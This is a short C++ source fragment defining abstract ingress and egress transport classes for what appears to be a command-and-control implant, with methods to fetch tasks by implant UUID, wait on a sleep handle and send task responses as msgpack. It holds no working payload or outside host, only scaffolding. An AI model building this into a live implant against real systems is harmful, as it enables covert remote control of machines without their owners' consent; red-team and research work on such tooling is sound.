//base class to derive each transport method off of. tldr, it's more boilerplate code to do this,
// but makes it easier IMO to track/structure. 
class IIngressTransport {
public:
	virtual ~IIngressTransport() = default;
	// our "sleep" function, or what to wait for. 
	// Universal for a sleep time, or someting like a pipe that waits
	virtual HANDLE get_wait_handle() = 0;
    //add an init function so each class can init itself if needed
    virtual bool initialize() = 0;
	//func to get our task
	virtual nlohmann::json create_get_request(const std::string& uuid, bool full_metadata = false) = 0;
    virtual nlohmann::json get(std::string implant_uuid) = 0; 
    //protected = only members/children can use
protected:
    std::vector<uint8_t> pack_to_msgpack(const nlohmann::json& json_data) {
        return nlohmann::json::to_msgpack(json_data);
    }

    nlohmann::json unpack_to_json(const std::vector<uint8_t> msgpack_data) {
        try {
            nlohmann::json result = nlohmann::json::from_msgpack(msgpack_data);
            return result;
        }
        catch (nlohmann::json::parse_error& e) {
            std::cerr << "JSON Parse Error: " << e.what() << std::endl;
            std::cerr << "Byte position of error: " << e.byte << std::endl;

            // PRINT THE RAW HEX to see what you actually received
            std::cerr << "Raw Buffer (Hex): ";
            for (auto byte : msgpack_data) {
                printf("%02X ", (unsigned char)byte);
            }
            std::cout << std::endl;

            return nlohmann::json(); // Return null json to prevent crash
        }
    }
};

class IEgressTransport {
public:
	virtual ~IEgressTransport() = default;
	//func to send response
	virtual void send_response(const std::string& uuid, const nlohmann::json& task_response_array) = 0;

protected:
    std::vector<uint8_t> pack_to_msgpack(const nlohmann::json& json_data) {
        return nlohmann::json::to_msgpack(json_data);
    }

};

